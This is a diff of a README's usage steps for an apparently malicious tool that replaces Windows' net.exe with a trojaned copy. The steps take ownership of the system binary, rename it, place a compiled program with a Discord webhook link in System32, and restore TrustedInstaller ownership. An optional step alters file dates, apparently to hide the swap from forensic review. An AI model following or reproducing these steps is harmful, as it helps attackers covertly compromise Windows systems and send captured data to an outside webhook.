@@ -9,13 +9,17 @@ For support and assistance please join [the official support discord](https://di
 ## Usage
 1. rename net.exe to not.exe
     - `takeown /F \windows\system32\net.exe`
-    - `cacls \windows\system32\net.exe /e /p <username>:f`
+    - `icacls \windows\system32\net.exe /grant administrator:F`
     - `move \windows\system32\net.exe \windows\system32\not.exe`
-3. Place your discord web hook link into the program
-4. Compile this program and put it in `C:\Windows\System32\`
-5. Add dependencies to `C:\Windows\System32\`
-6. (optional) change dates on files
-7. Flourish
+2. give privs back to trusted installer
+    - `icacls \windows\system32\net.exe /grant "NT SERVICE\TrustedInstaller:F"`
+    - remove administrators and administrator
+    - change trusted installer to owner
+4. Place your discord web hook link into the program
+5. Compile this program and put it in `C:\Windows\System32\`
+6. Add dependencies to `C:\Windows\System32\`
+7. (optional) change dates on files
+8. Flourish
 
 ### Dependencies
 - everything in the release folder:
